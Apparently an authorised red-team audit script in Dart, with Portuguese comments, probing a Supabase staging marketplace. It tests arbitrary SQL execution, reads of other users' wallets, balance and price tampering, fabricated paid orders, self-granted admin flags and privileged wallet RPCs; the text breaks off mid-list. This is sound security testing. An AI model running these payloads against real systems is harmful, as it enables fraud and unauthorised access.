/// RED TEAM CEGO C — auditoria independente STAGING (2026-08-29)
/// Atacante: JWT buyer/seller + anon. service_role só para dump de schema e
/// verificação before/after (não como capacidade de ataque).
library;

import 'dart:convert';
import 'dart:io';
import 'dart:math';

import 'package:http/http.dart' as http;

import 'live_ops_staging_client.dart';

const stagingRef = 'fxdknzrqjenzqcvnwqqq';
const frozenAt = '2026-08-29T13:30:00+01:00';

final results = <Map<String, dynamic>>[];
final blocked = <Map<String, dynamic>>[];
final chains = <Map<String, dynamic>>[];
final coverage = <String>[];
final gaps = <String>[];
final artifacts = <String>[];

late String base;
late String anon;
late String service;
late String buyerJwt;
late String sellerJwt;
late String buyerId;
late String sellerId;
late LiveOpsStagingClient sb;

String clip(Object? v, [int n = 900]) {
  final s = v is String ? v : jsonEncode(v);
  if (s.length <= n) return s;
  return '${s.substring(0, n)}…';
}

Map<String, String> hUser(String jwt) => {
      'apikey': anon,
      'Authorization': 'Bearer $jwt',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> hAnon() => {
      'apikey': anon,
      'Authorization': 'Bearer $anon',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Map<String, String> hSvc() => {
      'apikey': service,
      'Authorization': 'Bearer $service',
      'Content-Type': 'application/json',
      'Prefer': 'return=representation',
    };

Future<http.Response> rest(
  String method,
  String path, {
  Map<String, String>? headers,
  Object? body,
}) {
  final uri = Uri.parse('$base$path');
  final h = headers ?? hUser(buyerJwt);
  final encoded = body == null
      ? null
      : (body is String ? body : jsonEncode(body));
  switch (method) {
    case 'GET':
      return http.get(uri, headers: h);
    case 'POST':
      return http.post(uri, headers: h, body: encoded);
    case 'PATCH':
      return http.patch(uri, headers: h, body: encoded);
    case 'DELETE':
      return http.delete(uri, headers: h, body: encoded);
    case 'HEAD':
      return http.head(uri, headers: h);
    default:
      throw ArgumentError(method);
  }
}

Future<http.Response> rpcRaw(
  String fn,
  Map<String, dynamic> params, {
  required String jwt,
  bool anonKeyOnly = false,
}) {
  return http.post(
    Uri.parse('$base/rest/v1/rpc/$fn'),
    headers: anonKeyOnly ? hAnon() : hUser(jwt),
    body: jsonEncode(params),
  );
}

Future<http.Response> edge(
  String fn, {
  required String jwt,
  Object? body,
  String method = 'POST',
  Map<String, String>? extraHeaders,
  String query = '',
  bool asAnon = false,
}) {
  final uri = Uri.parse('$base/functions/v1/$fn$query');
  final h = <String, String>{
    'apikey': anon,
    'Authorization': 'Bearer ${asAnon ? anon : jwt}',
    'Content-Type': 'application/json',
    ...?extraHeaders,
  };
  if (method == 'GET') return http.get(uri, headers: h);
  return http.post(uri, headers: h, body: body == null ? null : jsonEncode(body));
}

Future<dynamic> svcSql(String sql) async {
  final res = await http.post(
    Uri.parse('$base/rest/v1/rpc/run_sql_string'),
    headers: hSvc(),
    body: jsonEncode({'sql': sql}),
  );
  if (res.statusCode >= 400) {
    return {'_http': res.statusCode, '_body': clip(res.body, 400)};
  }
  if (res.body.isEmpty) return null;
  try {
    return jsonDecode(res.body);
  } catch (_) {
    return res.body;
  }
}

Future<List<Map<String, dynamic>>> svcSelect(
  String table, {
  String select = '*',
  String? filter,
  int limit = 20,
}) async {
  var path = '/rest/v1/$table?select=$select&limit=$limit';
  if (filter != null) path += '&$filter';
  final res = await rest('GET', path, headers: hSvc());
  if (res.statusCode >= 400) return [];
  final decoded = jsonDecode(res.body);
  if (decoded is! List) return [];
  return [
    for (final e in decoded)
      if (e is Map) Map<String, dynamic>.from(e),
  ];
}

void addResult({
  required String id,
  required String severity,
  required String title,
  required String verdict, // FAIL | PASS | NÃO CONFIRMADA | INFO
  required String pre,
  required String exploit,
  required String proof,
  required String impact,
  String root = '',
  String boundary = '',
  String repro = 'reproduzível em staging com este script',
}) {
  final row = {
    'id': id,
    'severity': severity,
    'title': title,
    'verdict': verdict,
    'pre': pre,
    'exploit': exploit,
    'proof': proof,
    'impact': impact,
    'root': root,
    'boundary': boundary,
    'repro': repro,
  };
  if (verdict == 'FAIL') {
    results.add(row);
  } else {
    blocked.add(row);
  }
}

void pass(String id, String title, String why) {
  addResult(
    id: id,
    severity: '—',
    title: title,
    verdict: 'PASS',
    pre: 'JWT buyer/seller ou anon',
    exploit: title,
    proof: why,
    impact: 'efeito ilegítimo não obtido',
  );
}

Future<void> main() async {
  Directory.current = Directory(
    Platform.script.toFilePath().contains('tool')
        ? File(Platform.script.toFilePath()).parent.parent.path
        : Directory.current.path,
  );
  final env = loadLiveOpsStagingEnv();
  base = normalizeSupabaseProjectUrl(envRequire(env, 'SUPABASE_URL'));
  anon = envRequire(env, 'SUPABASE_ANON_KEY');
  service = envRequire(env, 'SUPABASE_SERVICE_ROLE_KEY');
  if (!base.contains(stagingRef)) {
    stderr.writeln('ABORT: URL não é staging $stagingRef');
    exit(2);
  }

  sb = LiveOpsStagingClient(
    url: base,
    anonKey: anon,
    serviceRoleKey: service,
  );

  buyerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  sellerJwt = await sb.signIn(
    email: envRequire(env, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(env, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  buyerId = await sb.userIdForAccessToken(buyerJwt);
  sellerId = await sb.userIdForAccessToken(sellerJwt);
  stdout.writeln('auth buyer=$buyerId seller=$sellerId');
  Directory('tool/reports/redteam_cego_c_20260829').createSync(recursive: true);

  final openApiTables = await reconOpenApi();
  await reconSqlAsAttacker();
  final schema = await dumpSchemaAsAuditor();
  await probeTables(openApiTables);
  await probeRpcs(openApiTables);
  await probeEdges();
  await probeStorage();
  await probeCompositions();
  await probeJwtConfusion();
  await probeConcurrencyHints();

  final outDir = Directory('tool/reports/redteam_cego_c_20260829');
  outDir.createSync(recursive: true);
  final jsonPath = '${outDir.path}/probe.json';
  final mdPath = '${outDir.path}/REDTEAM_CEGO_C_CONGELADO.md';
  File(jsonPath).writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({
      'frozen_at': frozenAt,
      'project': stagingRef,
      'production_touched': false,
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'findings': results,
      'blocked': blocked,
      'chains': chains,
      'coverage': coverage,
      'gaps': gaps,
      'schema_excerpt': schema,
      'openapi_tables': openApiTables['tables'],
      'openapi_rpcs_sample': openApiTables['rpc_sample'],
    }),
  );
  artifacts.add(jsonPath);
  File(mdPath).writeAsStringSync(renderMd(schema, openApiTables));
  artifacts.add(mdPath);
  stdout.writeln('WROTE $mdPath');
  stdout.writeln(
    'FAIL=${results.length} PASS/blocked=${blocked.length}',
  );
}

Future<Map<String, dynamic>> reconOpenApi() async {
  coverage.add('OpenAPI PostgREST (anon + buyer)');
  final res = await http.get(
    Uri.parse('$base/rest/v1/'),
    headers: {
      ...hUser(buyerJwt),
      'Accept': 'application/openapi+json',
    },
  );
  final tables = <String>[];
  final rpcs = <String>[];
  if (res.statusCode == 200) {
    try {
      final spec = jsonDecode(res.body) as Map<String, dynamic>;
      final paths = spec['paths'];
      if (paths is Map) {
        for (final k in paths.keys) {
          final p = k.toString();
          if (p.startsWith('/rpc/')) {
            rpcs.add(p.substring(5));
          } else if (p.startsWith('/') && !p.contains('{')) {
            tables.add(p.substring(1));
          }
        }
      }
    } catch (e) {
      gaps.add('OpenAPI parse failed: $e');
    }
  } else {
    gaps.add('OpenAPI HTTP ${res.statusCode}');
  }
  rpcs.sort();
  tables.sort();
  stdout.writeln(
    'openapi http=${res.statusCode} tables=${tables.length} rpcs=${rpcs.length} body=${clip(res.body, 200)}',
  );
  final dir = Directory('tool/reports/redteam_cego_c_20260829');
  dir.createSync(recursive: true);
  File('${dir.path}/openapi_tables.txt').writeAsStringSync(tables.join('\n'));
  File('${dir.path}/openapi_rpcs.txt').writeAsStringSync(rpcs.join('\n'));
  File('${dir.path}/openapi_raw_head.txt').writeAsStringSync(clip(res.body, 4000));
  if (tables.isEmpty) {
    final res2 = await http.get(
      Uri.parse('$base/rest/v1/'),
      headers: {
        'apikey': anon,
        'Authorization': 'Bearer $buyerJwt',
        'Accept': 'application/json',
      },
    );
    File('${dir.path}/openapi_fallback_head.txt')
        .writeAsStringSync('http=${res2.statusCode}\n${clip(res2.body, 4000)}');
  }
  artifacts.add('${dir.path}/openapi_rpcs.txt');
  return {
    'tables': tables,
    'rpcs': rpcs,
    'rpc_sample': rpcs.take(80).toList(),
    'http': res.statusCode,
  };
}

Future<void> reconSqlAsAttacker() async {
  coverage.add('RPC run_sql_string como buyer/anon/seller');
  for (final who in [
    ('buyer', buyerJwt, false),
    ('seller', sellerJwt, false),
    ('anon', anon, true),
  ]) {
    final res = await rpcRaw(
      'run_sql_string',
      {'sql': 'select current_user, session_user'},
      jwt: who.$2,
      anonKeyOnly: who.$3,
    );
    final ok = res.statusCode >= 200 && res.statusCode < 300;
    if (ok) {
      addResult(
        id: 'C-SQL-01-${who.$1}',
        severity: 'P0',
        title: 'run_sql_string executável como ${who.$1}',
        verdict: 'FAIL',
        pre: 'JWT ${who.$1}',
        exploit: 'POST /rpc/run_sql_string {sql: select current_user}',
        proof: 'HTTP ${res.statusCode} ${clip(res.body, 400)}',
        impact: 'execução SQL arbitrário → compromisso sistémico',
        root: 'GRANT EXECUTE em SECURITY DEFINER run_sql_string',
        boundary: 'PostgREST RPC',
      );
    } else {
      pass(
        'C-SQL-01-${who.$1}',
        'run_sql_string como ${who.$1}',
        'HTTP ${res.statusCode} ${clip(res.body, 180)}',
      );
    }
  }
}

Future<Map<String, dynamic>> dumpSchemaAsAuditor() async {
  coverage.add('Dump schema auditor (service_role → run_sql_string)');
  final out = <String, dynamic>{};
  out['rls'] = await svcSql('''
    select c.relname as table, c.relrowsecurity as rls, c.relforcerowsecurity as force_rls
    from pg_class c
    join pg_namespace n on n.oid=c.relnamespace
    where n.nspname='public' and c.relkind in ('r','p')
    order by 1
  ''');
  out['definer_granted'] = await svcSql('''
    select p.proname, p.prosecdef as security_definer,
           pg_get_function_identity_arguments(p.oid) as args,
           array(
             select g.grantee::text from aclexplode(p.proacl) g
           ) as grantees_raw
    from pg_proc p
    join pg_namespace n on n.oid=p.pronamespace
    where n.nspname='public' and p.prosecdef = true
      and p.proname not like 'pg_%'
    order by 1
    limit 400
  ''');
  out['exec_grants'] = await svcSql('''
    select p.proname,
           r.rolname as grantee,
           has_function_privilege(r.oid, p.oid, 'EXECUTE') as can_exec
    from pg_proc p
    join pg_namespace n on n.oid=p.pronamespace
    join pg_roles r on r.rolname in ('anon','authenticated','public')
    where n.nspname='public' and p.prosecdef
      and has_function_privilege(r.oid, p.oid, 'EXECUTE')
    order by 1,2
  ''');
  out['money_tables'] = await svcSql('''
    select tablename, rowsecurity
    from pg_tables
    where schemaname='public'
      and tablename similar to '%(order|wallet|payout|refund|stripe|raffle|reserv|live_tip|commission)%'
    order by 1
  ''');
  return out;
}

Future<void> probeTables(Map<String, dynamic> openApi) async {
  coverage.add('SELECT/INSERT/UPDATE/DELETE PostgREST em tabelas críticas');
  final tables = (openApi['tables'] as List?)?.cast<String>() ?? [];
  final interesting = [
    'orders',
    'products',
    'wallets',
    'wallet_transactions',
    'wallet_payout_ledger',
    'live_tips',
    'live_raffles',
    'live_raffle_winners',
    'live_raffle_tickets',
    'live_items',
    'live_reservation_requests',
    'lives',
    'profiles',
    'stripe_checkout_events',
    'fleaber_commissions',
    'seller_payout_details',
    'seller_direct_payment_details',
    'seller_bundle_discounts',
    'order_disputes',
    'chats',
    'chat_messages',
    'product_offers',
    'staff_action_logs',
    'app_logs',
    'ps_ingest_audit',
    'seller_helpers',
    'user_notifications',
  ];

  // --- Cross-user SELECT ---
  for (final t in interesting) {
    if (tables.isNotEmpty && !tables.contains(t)) continue;
    final res = await rest(
      'GET',
      '/rest/v1/$t?select=*&limit=5',
      headers: hUser(buyerJwt),
    );
    final body = clip(res.body, 280);
    if (res.statusCode == 200) {
      List rows = [];
      try {
        rows = jsonDecode(res.body) as List;
      } catch (_) {}
      final other = rows.where((e) {
        if (e is! Map) return false;
        final m = Map<String, dynamic>.from(e);
        for (final k in [
          'buyer_id',
          'seller_id',
          'user_id',
          'id',
          'owner_id',
        ]) {
          final v = m[k]?.toString();
          if (v != null &&
              v != buyerId &&
              (k == 'id' && t == 'wallets' ||
                  k == 'user_id' ||
                  k == 'buyer_id' ||
                  k == 'seller_id' && t != 'products')) {
            if (k == 'id' && t == 'wallets' && v != buyerId) return true;
            if (k != 'id' && v != buyerId && v != sellerId) return true;
            if (k == 'seller_id' && t == 'orders' && v == sellerId) {
              // own counterparty ok
            }
          }
        }
        return false;
      }).toList();
      // wallets: seeing other balances
      if (t == 'wallets') {
        final others = rows.where((e) {
          if (e is! Map) return false;
          return e['id']?.toString() != buyerId;
        }).toList();
        if (others.isNotEmpty) {
          addResult(
            id: 'C-TBL-WALLET-SELECT',
            severity: 'P1',
            title: 'Buyer lê wallets de outros',
            verdict: 'FAIL',
            pre: 'JWT buyer',
            exploit: 'GET /wallets',
            proof: clip(others, 400),
            impact: 'exposição de saldos alheios',
            boundary: 'RLS wallets',
          );
        } else {
          pass('C-TBL-WALLET-SELECT', 'SELECT wallets alheias',
              'só própria ou vazio (${rows.length} rows)');
        }
      } else if (t == 'stripe_checkout_events' && rows.isNotEmpty) {
        addResult(
          id: 'C-TBL-STRIPE-EVT',
          severity: 'P2',
          title: 'Buyer lê stripe_checkout_events',
          verdict: 'FAIL',
          pre: 'JWT buyer',
          exploit: 'GET /stripe_checkout_events',
          proof: body,
          impact: 'eventos de checkout / session ids visíveis',
          boundary: 'RLS stripe_checkout_events',
        );
      } else {
        pass(
          'C-TBL-SEL-$t',
          'SELECT $t',
          'HTTP ${res.statusCode} n=${rows.length} ${other.isEmpty ? "sem leak óbvio cross-user" : "rows=${other.length}"} $body',
        );
        if (other.isNotEmpty &&
            {'wallet_payout_ledger', 'live_tips', 'seller_payout_details'}
                .contains(t)) {
          addResult(
            id: 'C-TBL-XUSER-$t',
            severity: 'P1',
            title: 'SELECT $t com linhas de outros',
            verdict: 'FAIL',
            pre: 'JWT buyer',
            exploit: 'GET /$t',
            proof: clip(other, 400),
            impact: 'dados financeiros/privados de terceiros',
            boundary: 'RLS $t',
          );
        }
      }
    } else if (res.statusCode == 404 || res.statusCode == 406) {
      pass('C-TBL-SEL-$t', 'SELECT $t', 'não exposta HTTP ${res.statusCode}');
    } else {
      pass('C-TBL-SEL-$t', 'SELECT $t', 'HTTP ${res.statusCode} $body');
    }
  }

  // --- Wallet PATCH ---
  final wPatch = await rest(
    'PATCH',
    '/rest/v1/wallets?id=eq.$buyerId',
    headers: hUser(buyerJwt),
    body: {'balance': 99999.12},
  );
  final wAfter = await svcSelect('wallets',
      select: 'id,balance', filter: 'id=eq.$buyerId', limit: 1);
  final bal = wAfter.isEmpty ? null : wAfter.first['balance'];
  final bumped = bal != null && (num.tryParse('$bal') ?? 0) >= 99990;
  if (wPatch.statusCode < 300 && bumped) {
    addResult(
      id: 'C-TBL-WALLET-PATCH',
      severity: 'P0',
      title: 'Buyer PATCH wallets.balance',
      verdict: 'FAIL',
      pre: 'JWT buyer',
      exploit: 'PATCH /wallets balance=99999',
      proof: 'HTTP ${wPatch.statusCode} after=$bal body=${clip(wPatch.body)}',
      impact: 'criação de dinheiro',
      boundary: 'RLS/trigger wallets',
    );
    // revert
    await rest('PATCH', '/rest/v1/wallets?id=eq.$buyerId',
        headers: hSvc(), body: {'balance': 0});
  } else {
    pass(
      'C-TBL-WALLET-PATCH',
      'PATCH wallets.balance',
      'HTTP ${wPatch.statusCode} bal_after=$bal ${clip(wPatch.body, 200)}',
    );
  }

  final wOther = await rest(
    'PATCH',
    '/rest/v1/wallets?id=eq.$sellerId',
    headers: hUser(buyerJwt),
    body: {'balance': 1},
  );
  pass(
    'C-TBL-WALLET-PATCH-OTHER',
    'PATCH wallet do seller como buyer',
    'HTTP ${wOther.statusCode} ${clip(wOther.body, 160)}',
  );

  // --- Products: buyer altera preço/qty do seller ---
  final sellerProducts = await svcSelect(
    'products',
    select: 'id,price,quantity,seller_id,title',
    filter: 'seller_id=eq.$sellerId',
    limit: 8,
  );
  if (sellerProducts.isEmpty) {
    gaps.add('sem products do seller para PATCH preço');
  } else {
    final p = sellerProducts.first;
    final pid = p['id'];
    final oldPrice = p['price'];
    final oldQty = p['quantity'];
    final patchP = await rest(
      'PATCH',
      '/rest/v1/products?id=eq.$pid',
      headers: hUser(buyerJwt),
      body: {'price': 0.01, 'quantity': 9999},
    );
    final afterP = await svcSelect('products',
        select: 'id,price,quantity', filter: 'id=eq.$pid', limit: 1);
    final np = afterP.isEmpty ? null : afterP.first;
    final changed = np != null &&
        ((num.tryParse('${np['price']}') ?? -1) == 0.01 ||
            (num.tryParse('${np['quantity']}') ?? -1) == 9999);
    if (patchP.statusCode < 300 && changed) {
      addResult(
        id: 'C-TBL-PROD-BUYER-PATCH',
        severity: 'P0',
        title: 'Buyer altera preço/stock de produto alheio',
        verdict: 'FAIL',
        pre: 'produto do seller $pid',
        exploit: 'PATCH /products price=0.01 quantity=9999',
        proof: 'HTTP ${patchP.statusCode} after=$np',
        impact: 'pagar abaixo / oversell',
        boundary: 'RLS products',
      );
      await rest('PATCH', '/rest/v1/products?id=eq.$pid',
          headers: hSvc(),
          body: {'price': oldPrice, 'quantity': oldQty});
    } else {
      pass(
        'C-TBL-PROD-BUYER-PATCH',
        'Buyer PATCH product do seller',
        'HTTP ${patchP.statusCode} after=$np ${clip(patchP.body, 160)}',
      );
    }
  }

  // --- Orders: INSERT estados ilegítimos ---
  if (sellerProducts.isNotEmpty) {
    final pid = sellerProducts.first['id'];
    final catalogPrice = sellerProducts.first['price'];

    Future<void> tryInsert(String id, Map<String, dynamic> row, String sev,
        String title) async {
      final ins = await rest(
        'POST',
        '/rest/v1/orders',
        headers: hUser(buyerJwt),
        body: row,
      );
      var createdId = '';
      if (ins.statusCode < 300) {
        try {
          final d = jsonDecode(ins.body);
          if (d is List && d.isNotEmpty) createdId = d[0]['id']?.toString() ?? '';
          if (d is Map) createdId = d['id']?.toString() ?? '';
        } catch (_) {}
      }
      Map<String, dynamic>? dbRow;
      if (createdId.isNotEmpty) {
        final rows = await svcSelect('orders',
            select:
                'id,status,price_total,contract_unit_cents,contract_qty,quantity,buyer_id,live_raffle_id,payment_method',
            filter: 'id=eq.$createdId',
            limit: 1);
        dbRow = rows.isEmpty ? null : rows.first;
      }
      final st = dbRow?['status']?.toString();
      final illicit = createdId.isNotEmpty &&
          (row['status'] == 'pago' && st == 'pago' ||
              row['status'] == 'premio_rifa' && st == 'premio_rifa' ||
              (row['contract_unit_cents'] == 1 &&
                  dbRow?['contract_unit_cents'] == 1) ||
              (row['buyer_id'] == sellerId &&
                  dbRow?['buyer_id'] == sellerId));
      if (illicit) {
        addResult(
          id: id,
          severity: sev,
          title: title,
          verdict: 'FAIL',
          pre: 'JWT buyer, product $pid',
          exploit: 'INSERT orders ${jsonEncode(row)}',
          proof: 'HTTP ${ins.statusCode} db=$dbRow body=${clip(ins.body, 300)}',
          impact: title,
          boundary: 'RLS/trigger orders INSERT',
        );
      } else {
        pass(
          id,
          title,
          'HTTP ${ins.statusCode} created=$createdId db=$dbRow ${clip(ins.body, 180)}',
        );
      }
      if (createdId.isNotEmpty &&
          (st == 'pago' || st == 'premio_rifa' || row['status'] == 'pago')) {
        await rest('PATCH', '/rest/v1/orders?id=eq.$createdId',
            headers: hSvc(),
            body: {'status': 'cancelado', 'is_reservation': false});
      }
    }

    await tryInsert(
      'C-ORD-INS-PAGO',
      {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'price_total': 0.5,
        'status': 'pago',
        'payment_method': 'Pagamento na App',
        'quantity': 1,
        'is_reservation': false,
      },
      'P0',
      'INSERT order já paga',
    );
    await tryInsert(
      'C-ORD-INS-PREMIO',
      {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'price_total': 0,
        'status': 'premio_rifa',
        'payment_method': 'premio_rifa',
        'quantity': 1,
      },
      'P0',
      'INSERT order premio_rifa fabricado',
    );
    await tryInsert(
      'C-ORD-INS-CONTRACT-1C',
      {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'price_total': 0.01,
        'status': 'reserva_pendente',
        'payment_method': 'Pagamento na App',
        'quantity': 1,
        'is_reservation': true,
        'contract_unit_cents': 1,
        'contract_qty': 1,
      },
      'P0',
      'INSERT order com contract_unit_cents=1',
    );
    await tryInsert(
      'C-ORD-INS-OTHER-BUYER',
      {
        'product_id': pid,
        'buyer_id': sellerId,
        'seller_id': sellerId,
        'price_total': catalogPrice,
        'status': 'reserva_pendente',
        'payment_method': 'Pagamento na App',
        'quantity': 1,
      },
      'P1',
      'INSERT order em nome do seller',
    );

    // INSERT legítimo + PATCH contrato / status / qty
    final legit = await rest(
      'POST',
      '/rest/v1/orders',
      headers: hUser(buyerJwt),
      body: {
        'product_id': pid,
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'price_total': catalogPrice,
        'status': 'reserva_pendente',
        'payment_method': 'Pagamento na App',
        'quantity': 1,
        'is_reservation': true,
      },
    );
    String legitId = '';
    if (legit.statusCode < 300) {
      try {
        final d = jsonDecode(legit.body);
        if (d is List && d.isNotEmpty) legitId = '${d[0]['id']}';
        if (d is Map) legitId = '${d['id']}';
      } catch (_) {}
    }
    pass(
      'C-ORD-INS-LEGIT',
      'INSERT reserva_pendente (fluxo app)',
      'HTTP ${legit.statusCode} id=$legitId ${clip(legit.body, 160)}',
    );

    if (legitId.isNotEmpty) {
      final patches = <String, Map<String, dynamic>>{
        'C-ORD-PATCH-STATUS-PAGO': {'status': 'pago'},
        'C-ORD-PATCH-CONTRACT': {'contract_unit_cents': 1, 'contract_qty': 1},
        'C-ORD-PATCH-QTY': {'quantity': 99},
        'C-ORD-PATCH-PRICE': {'price_total': 0.01},
        'C-ORD-PATCH-SELLER': {'seller_id': buyerId},
        'C-ORD-PATCH-PREMIO': {'status': 'premio_rifa'},
        'C-ORD-PATCH-AMOUNT-PAID': {'amount_paid_cents': 1},
      };
      for (final e in patches.entries) {
        final before = await svcSelect('orders',
            select:
                'id,status,contract_unit_cents,contract_qty,quantity,price_total,seller_id,amount_paid_cents',
            filter: 'id=eq.$legitId',
            limit: 1);
        final pr = await rest(
          'PATCH',
          '/rest/v1/orders?id=eq.$legitId',
          headers: hUser(buyerJwt),
          body: e.value,
        );
        final after = await svcSelect('orders',
            select:
                'id,status,contract_unit_cents,contract_qty,quantity,price_total,seller_id,amount_paid_cents',
            filter: 'id=eq.$legitId',
            limit: 1);
        final b = before.isEmpty ? {} : before.first;
        final a = after.isEmpty ? {} : after.first;
        var mutated = false;
        e.value.forEach((k, v) {
          if ('${a[k]}' == '$v' && '${b[k]}' != '$v') mutated = true;
        });
        if (pr.statusCode < 300 && mutated) {
          final sev = (e.key.contains('PAGO') ||
                  e.key.contains('CONTRACT') ||
                  e.key.contains('PREMIO') ||
                  e.key.contains('AMOUNT'))
              ? 'P0'
              : 'P1';
          addResult(
            id: e.key,
            severity: sev,
            title: 'Buyer PATCH orders ${e.value.keys.join(",")}',
            verdict: 'FAIL',
            pre: 'order própria $legitId',
            exploit: 'PATCH ${e.value}',
            proof: 'before=$b after=$a HTTP ${pr.statusCode}',
            impact: 'estado/preço/qty não autoritativo',
            boundary: 'RLS/trigger orders UPDATE',
          );
        } else {
          pass(
            e.key,
            'PATCH orders ${e.value}',
            'HTTP ${pr.statusCode} before=$b after=$a ${clip(pr.body, 140)}',
          );
        }
      }

      // seller PATCH order do buyer para pago
      final sPatch = await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.$legitId',
        headers: hUser(sellerJwt),
        body: {'status': 'pago'},
      );
      final afterS = await svcSelect('orders',
          select: 'id,status', filter: 'id=eq.$legitId', limit: 1);
      final stS = afterS.isEmpty ? '' : afterS.first['status']?.toString();
      if (sPatch.statusCode < 300 && stS == 'pago') {
        addResult(
          id: 'C-ORD-SELLER-FORCE-PAGO',
          severity: 'P0',
          title: 'Seller marca order como paga sem Stripe',
          verdict: 'FAIL',
          pre: 'order $legitId',
          exploit: 'PATCH status=pago JWT seller',
          proof: 'HTTP ${sPatch.statusCode} status=$stS',
          impact: 'stock/wallet sem pagamento',
          boundary: 'RLS/trigger orders UPDATE',
        );
      } else {
        pass(
          'C-ORD-SELLER-FORCE-PAGO',
          'Seller PATCH status=pago',
          'HTTP ${sPatch.statusCode} status=$stS ${clip(sPatch.body, 140)}',
        );
      }

      // cleanup hold
      await rest(
        'PATCH',
        '/rest/v1/orders?id=eq.$legitId',
        headers: hSvc(),
        body: {'status': 'cancelado', 'is_reservation': false},
      );
    }
  }

  // --- raffle winners INSERT ---
  final raffles = await svcSelect('live_raffles', select: 'id,live_id', limit: 3);
  if (raffles.isNotEmpty) {
    final rid = raffles.first['id'];
    final insW = await rest(
      'POST',
      '/rest/v1/live_raffle_winners',
      headers: hUser(buyerJwt),
      body: {'raffle_id': rid, 'user_id': buyerId},
    );
    if (insW.statusCode < 300) {
      addResult(
        id: 'C-RAF-INS-WINNER',
        severity: 'P0',
        title: 'Buyer INSERT live_raffle_winners',
        verdict: 'FAIL',
        pre: 'raffle $rid',
        exploit: 'POST live_raffle_winners',
        proof: 'HTTP ${insW.statusCode} ${clip(insW.body, 300)}',
        impact: 'auto-proclamar vencedor',
        boundary: 'RLS live_raffle_winners',
      );
    } else {
      pass(
        'C-RAF-INS-WINNER',
        'INSERT live_raffle_winners',
        'HTTP ${insW.statusCode} ${clip(insW.body, 160)}',
      );
    }
  } else {
    gaps.add('sem live_raffles para INSERT winner');
  }

  // --- profiles admin flag ---
  final prof = await rest(
    'PATCH',
    '/rest/v1/profiles?id=eq.$buyerId',
    headers: hUser(buyerJwt),
    body: {'is_admin': true, 'role': 'admin'},
  );
  pass(
    'C-PROF-ADMIN',
    'PATCH profiles is_admin/role',
    'HTTP ${prof.statusCode} ${clip(prof.body, 180)}',
  );

  // --- wallet_transactions INSERT ---
  final wt = await rest(
    'POST',
    '/rest/v1/wallet_transactions',
    headers: hUser(buyerJwt),
    body: {
      'wallet_id': buyerId,
      'amount': 100,
      'type': 'credit',
      'reason': 'cego_c',
    },
  );
  pass(
    'C-WT-INS',
    'INSERT wallet_transactions',
    'HTTP ${wt.statusCode} ${clip(wt.body, 180)}',
  );
}

Future<void> probeRpcs(Map<String, dynamic> openApi) async {
  coverage.add('RPCs financeiras / admin / rifa / wallet / reservas');
  final known = (openApi['rpcs'] as List?)?.cast<String>() ?? [];

  Future<void> call({
    required String id,
    required String fn,
    required Map<String, dynamic> params,
    required String jwt,
    required String who,
    String sevIfSuccess = 'P1',
    bool successIsBad = true,
    bool Function(int code, String body)? isBad,
  }) async {
    final res = await rpcRaw(fn, params, jwt: jwt);
    final body = clip(res.body, 280);
    final httpOk = res.statusCode >= 200 && res.statusCode < 300;
    var parsedOk = false;
    try {
      final d = jsonDecode(res.body);
      if (d == true) parsedOk = true;
      if (d is Map && (d['ok'] == true || d['success'] == true)) parsedOk = true;
    } catch (_) {}
    final bad = isBad != null
        ? isBad(res.statusCode, res.body)
        : (successIsBad && httpOk && (parsedOk || res.body.isEmpty || res.body == 'true'));
    // Many RPCs return json with ok:false on auth fail but HTTP 200
    var denied = false;
    final low = res.body.toLowerCase();
    if (low.contains('not authorized') ||
        low.contains('permission') ||
        low.contains('sem permiss') ||
        low.contains('forbidden') ||
        low.contains('not allowed') ||
        low.contains('"ok":false') ||
        low.contains('"ok": false') ||
        res.statusCode == 401 ||
        res.statusCode == 403 ||
        res.statusCode == 42501 ||
        low.contains('42501') ||
        low.contains('row-level security') ||
        low.contains('pgrst202') ||
        low.contains('could not find the function') ||
        low.contains('insufficient') ||
        low.contains('auth.uid')) {
      denied = true;
    }
    if (id.contains('SKIP')) {
      pass(id, 'RPC $fn as $who (legítimo se self)', 'HTTP ${res.statusCode} $body');
      return;
    }
    if (httpOk && !denied && successIsBad) {
      // Heuristic: HTTP 200 without explicit ok:false
      final explicitFail = low.contains('"ok":false') || low.contains('"ok": false');
      if (!explicitFail) {
        addResult(
          id: id,
          severity: sevIfSuccess,
          title: 'RPC $fn succedeu como $who',
          verdict: 'FAIL',
          pre: 'JWT $who',
          exploit: 'rpc $fn ${jsonEncode(params)}',
          proof: 'HTTP ${res.statusCode} $body',
          impact: 'RPC privilegiada invocável pelo atacante',
          boundary: 'GRANT EXECUTE / auth interno',
        );
        return;
      }
    }
    pass(id, 'RPC $fn as $who', 'HTTP ${res.statusCode} $body');
  }

  final moneyRpcs = <(String, String, Map<String, dynamic>, String, String)>[
    (
      'C-RPC-CREDIT',
      'batata_credit_wallet_once',
      {
        'p_user_id': buyerId,
        'p_amount': 50,
        'p_idempotency_key': 'cego_c_${DateTime.now().millisecondsSinceEpoch}',
        'p_reason': 'cego',
      },
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-DEBIT',
      'batata_debit_wallet_once',
      {
        'p_user_id': sellerId,
        'p_amount': 1,
        'p_idempotency_key': 'cego_c_d_${DateTime.now().millisecondsSinceEpoch}',
      },
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-PAYOUT-DEBIT',
      'batata_wallet_payout_debit',
      {
        'p_user_id': sellerId,
        'p_amount_cents': 100,
        'p_idempotency_key': 'cego_c_po_${DateTime.now().millisecondsSinceEpoch}',
      },
      buyerJwt,
      'P0'
    ),
    (
      'C-RPC-PAYOUT-FINISH',
      'batata_wallet_payout_finish',
      {
        'p_user_id': sellerId,
        'p_idempotency_key': 'x',
